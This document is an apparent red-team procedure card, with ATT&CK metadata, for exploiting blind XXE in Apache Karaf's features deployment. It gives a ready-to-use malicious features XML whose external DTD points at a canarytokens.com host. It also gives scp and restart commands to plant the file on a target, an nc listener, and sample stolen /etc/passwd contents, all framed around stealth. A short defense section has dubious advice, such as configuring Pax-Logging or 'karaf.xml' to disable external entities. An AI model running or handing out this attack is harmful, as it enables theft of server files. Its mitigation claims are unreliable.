---
id: 02721c75-23e9-443f-939c-7bd308f98080
name: Apache-Karaf-XXE-Out-of-Band-Data-Exfiltration
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:44.450278+00:00'
updated_at: '2023-04-10T20:24:44.644232+00:00'
tactics:
  - '[[tactics/Execution|TA0002 - Execution]]'
  - '[[tactics/Exfiltration|TA0010 - Exfiltration]]'
techniques:
  - >-
    [[techniques/Exploitation for Client Execution|T1203 - Exploitation for
    Client Execution]]
  - >-
    [[techniques/Exfiltration Over Alternative Protocol|T1048 - Exfiltration
    Over Alternative Protocol]]
sub_techniques:
  - '[[sub-techniques/Malicious File|T1203.001 - Malicious File]]'
  - >-
    [[sub-techniques/Exfiltration Over Unencrypted Non-C2 Protocol|T1048.003 -
    Exfiltration Over Unencrypted Non-C2 Protocol]]
tags:
  - '[[tags/Exploiting blind XXE to exfiltrate data out-of-band]]'
  - '[[tags/XML External Entity]]'
  - '[[tags/XXE OOB with Apache Karaf]]'
commands:
  - '[[commands/create-karaf-xxe-xml-payload]]'
  - '[[commands/scp-deploy-xml-to-karaf]]'
  - '[[commands/karaf-restart-to-trigger-deploy]]'
platforms:
  - Linux
  - Java
validated: true
---

# Apache-Karaf-XXE-Out-of-Band-Data-Exfiltration

## Summary

This procedure exploits a blind XML External Entity (XXE) vulnerability in Apache Karaf's features deployment parser to achieve out-of-band exfiltration of sensitive data from the target server. By crafting a malicious features XML file that references an external DTD hosted on an attacker-controlled domain (such as a Canary token), the Karaf server processes the XML during deployment, fetching the DTD and inadvertently sending local file contents or system information to the attacker's server without direct visibility into the response.

## Description

Apache Karaf, an OSGi-based runtime for Java applications, uses an XML parser to process features deployment files. If the parser is configured to resolve external entities (common in older versions without strict DTD disabling), an attacker can inject malicious XML that defines parameter entities pointing to remote DTDs. When Karaf deploys the features file—typically by placing it in the deploy directory or using the console—the parser fetches the external DTD, which can instruct the server to exfiltrate data like /etc/passwd, configuration files, or environment variables via HTTP requests to the attacker's endpoint. This is a blind attack since the exfiltrated data is sent out-of-band, and success is confirmed by monitoring the attacker's server for incoming requests containing the payload. The target environment is a vulnerable Karaf instance (e.g., versions prior to mitigation in 4.2.x+), often exposed via file upload, console access, or directory write permissions. Expected outcomes include receipt of sensitive data on the exfil server, enabling further reconnaissance or lateral movement.

## Requirements

1. Write access to the Karaf server's deploy directory (e.g., /opt/apache-karaf/deploy/) or console access to issue deploy commands.
2. Control of an external HTTP server or service (e.g., Canarytokens.com) to host the malicious DTD and receive exfiltrated data.
3. Knowledge of target sensitive files (e.g., /etc/passwd for Linux users) to customize the exfil payload within the DTD.
4. Network connectivity from the Karaf server to the internet for out-of-band fetches.

## Defense

- Disable external entity resolution in the XML parser by configuring Karaf's Pax-Logging or underlying libraries (e.g., set 'features.xml' parsing to secure mode in karaf.xml).
- Implement input validation and sanitization for all XML uploads or deployments, rejecting any DOCTYPE declarations.
- Monitor network traffic for suspicious outbound HTTP requests to unexpected domains, especially from Java processes, using tools like Suricata or host firewalls.
- Use web application firewalls (WAFs) to block XXE payloads and enable logging for XML parsing events in Karaf.

## Objectives

1. Exfiltrate sensitive data from a vulnerable Apache Karaf server using blind XXE.
2. Maintain stealth while carrying out the attack by leveraging out-of-band channels.
3. Confirm successful exploitation via external server logs without alerting the target.

## Instructions

### Step 1: Create the Malicious Features XML Payload

**Context**: This step generates the XML file with an embedded external entity definition that points to your exfil server. The DOCTYPE declares a parameter entity (%dtd) fetched from the remote URL, which can be customized in the DTD to include exfil of specific files (e.g., via %file SYSTEM "file:///etc/passwd"). Why: This triggers the parser to resolve the entity during deployment, sending data out-of-band.

**Code** ([[codes/karaf-features-xxe-oob-payload]]):

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE doc [<!ENTITY % dtd SYSTEM "http://27av6zyg33g8q8xu338uvhnsc.canarytokens.com"> %dtd;]>
<features name="my-features" xmlns="http://karaf.apache.org/xmlns/features/v1.3.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
        xsi:schemaLocation="http://karaf.apache.org/xmlns/features/v1.3.0 http://karaf.apache.org/xmlns/features/v1.3.0">
    <feature name="deployer" version="2.0" install="auto">
    </feature>
</features>
```

**Command** ([[commands/create-karaf-xxe-xml-payload]]):

```bash
cat > malicious-features.xml << 'EOF'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE doc [<!ENTITY % dtd SYSTEM "http://27av6zyg33g8q8xu338uvhnsc.canarytokens.com"> %dtd;]>
<features name="my-features" xmlns="http://karaf.apache.org/xmlns/features/v1.3.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
        xsi:schemaLocation="http://karaf.apache.org/xmlns/features/v1.3.0 http://karaf.apache.org/xmlns/features/v1.3.0">
    <feature name="deployer" version="2.0" install="auto">
    </feature>
</features>
EOF
```

> This command writes the exact XML payload to a file on the attacker's machine. Customize the SYSTEM URL to your own DTD host if not using Canarytokens. Expected output: The file 'malicious-features.xml' is created successfully (verify with ls -l malicious-features.xml). If the URL is invalid, the file still creates but exfil will fail.

### Step 2: Upload the XML to Karaf Deploy Directory

**Context**: Transfer the crafted XML to the target's Karaf deploy folder, where auto-deployment will parse it and trigger the XXE. Why: Karaf monitors this directory for .xml files and processes them as features, resolving entities during parsing. If console access is available instead, use 'deploy file:///path/to/xml'.

**Command** ([[commands/scp-deploy-xml-to-karaf]]):

```bash
scp malicious-features.xml karaf_user@target_ip:/opt/apache-karaf/deploy/
```

> This securely copies the file over SSH to the deploy directory (adjust path if Karaf is installed elsewhere). Requires valid credentials for the target. Expected output: File transfer confirmation (e.g., 'malicious-features.xml 100% 1KB'). Verify upload with SSH: ls /opt/apache-karaf/deploy/ on target. Decision point: If SCP fails due to no SSH, use alternative like HTTP POST if Karaf's webconsole (port 8181) has an upload endpoint; otherwise, abort.

### Step 3: Restart Karaf to Trigger Deployment and XXE Processing

**Context**: If auto-deploy doesn't trigger immediately, restart the Karaf service to force parsing of the new features file. Why: Restart reloads the deploy directory, ensuring the XML is processed by the vulnerable parser, initiating the external entity fetch and exfil.

**Command** ([[commands/karaf-restart-to-trigger-deploy]]):

```bash
cd /opt/apache-karaf/bin && ./stop && nohup ./start &
```

> This stops and restarts the Karaf instance (run on target via SSH). Expected output: Startup logs showing 'Karaf started' or similar; monitor with tail -f /opt/apache-karaf/data/log/karaf.log for deployment errors. Decision point: If restart is not possible, wait for auto-deploy (up to 30s) or use console command 'features:install -s file:///opt/apache-karaf/deploy/malicious-features.xml'. Success: No parser errors in logs.

### Step 4: Monitor for Exfiltrated Data

**Context**: Observe the external server for incoming requests containing the exfiltrated data. Why: As a blind attack, direct response isn't visible; success is confirmed by data receipt on the OOB channel.

**Instructions**: If using Canarytokens, visit the token's dashboard to view triggered alerts and captured data (e.g., file contents embedded in HTTP POST body). For custom DTD, run a listener like nc -lvnp 80 on your server and inspect requests for %param1; content. Expected output: HTTP GET/POST to your URL with payload like 'exfil:/etc/passwd:root:x:0:0...'. Decision point: If no data after 5 minutes, check Karaf logs for DTD fetch attempts (e.g., grep 'http://your-url' karaf.log); re-customize DTD for specific files if needed.

> Success criteria: Receipt of sensitive data confirms XXE exploitation. If no exfil, verify internet access from target and DTD syntax.
